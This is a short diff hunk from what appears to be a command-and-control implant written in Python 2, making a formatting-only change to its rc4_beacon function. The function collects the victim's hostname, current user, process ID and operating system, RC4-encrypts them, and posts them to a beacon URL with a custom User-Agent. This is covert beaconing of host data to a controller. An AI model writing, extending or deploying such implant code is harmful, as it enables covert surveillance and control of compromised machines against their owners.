@@ -69,7 +69,7 @@ def initial_beacon(hostname, current_user, process_id, operating_system):
 def rc4_beacon(key, hostname, current_user, process_id, operating_system):
     try:
         post_data = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
-        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(post_data)))
+        request = urllib2.Request(beacon_url, data=crypt(key, json.dumps(post_data)))
         request.add_header("User-Agent", user_agent)
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
